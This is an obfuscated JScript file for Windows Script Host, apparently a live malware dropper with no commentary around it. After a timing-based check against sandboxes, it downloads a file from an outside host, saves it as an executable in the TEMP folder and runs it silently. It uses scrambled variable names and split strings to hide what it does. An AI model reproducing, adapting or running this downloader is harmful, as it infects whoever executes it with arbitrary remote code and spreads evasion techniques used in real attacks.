var _SB = false;
var _CO = "CreateObject";
var _WW = function _P() {return WScript[_CO]("WScript"+".Shell");}(), _N = 11;
var _ZB = "MSXML2.XMLHTTP";
var _JF = 2123213;
var _CT = 0;
function _OF(_F){_WW["Run"](_F, _CT, _CT);};
function _A(){return _ZB + "";};
function _UW(_O0, _XJ){_CT = _CT * 1; return _O0 - _XJ;};
function _KW(){return _CO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SB = true;
  @end
@*/
if (_SB)
{
var _VH = "";
function _S(){return 22;};
var _TG = 0; var _I = 0;
function _PG()
{
var _C = new this["Date"]();
var _JB = _C["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _C = new this["Date"]();
var _S0 = _C["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _C = new this["Date"]();
var _NH = _C["getUTCMilliseconds"]();
var _TG = "_W";
_TG = _UW(_S0, _JB);
var _I = "_X0";
_I = _UW(_NH, _S0);
_VH = "open";
return _UW(_TG, _I);
}
var _U = false;
var _FF = false;
for (var _X1 = _CT; _X1 < _S() * 1; _X1++){if (_PG() != _CT){
_U = true; 
_I = "31" + 11 * _TG + _I; 
_FF = true; 
break;
}}
function _ZQ() {return ((_U == true) && (_U == _FF)) ? 1 : _CT;};
if (_U && _ZQ() && _FF){
function _KV() {return _WW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DHMnuH8SIE5ks.ex" + "e";};
 _Z = _A();
 _ZA = WScript[_CO](_Z);
 var _H0 = 1;
 while (_H0){
try {
	if (_H0 == 1)
	{
		_ZA[_VH]("GET", "http://zakazdetali.kz/v7bsad", false);
		_ZA["send"]();
		_O = "Sleep";
	}
	WScript[_O](_S() + 120); 
	if (_ZA["readystate"] < 2 * 2) continue;
	_H0 = _CT;
	function _X(_P0) {var _YW = (1, 2, 3, 4, 5, _P0); return _YW;};
	_KC = WScript[_KW()]("ADODB.Stream");
	_Z = _KC;
	_Z[_VH]();
	_Z["type"] = _X(1);
	_Z["write"](_ZA["ResponseBody"]);
	_KC["position"] = _X(_CT);
	_Z["Save" + "ToFile"](_KV(), 2);
	_KC["cl"+"ose"]();
	_H = _KV();
	_OF(_H);
} catch(_W0){};
}
}
}

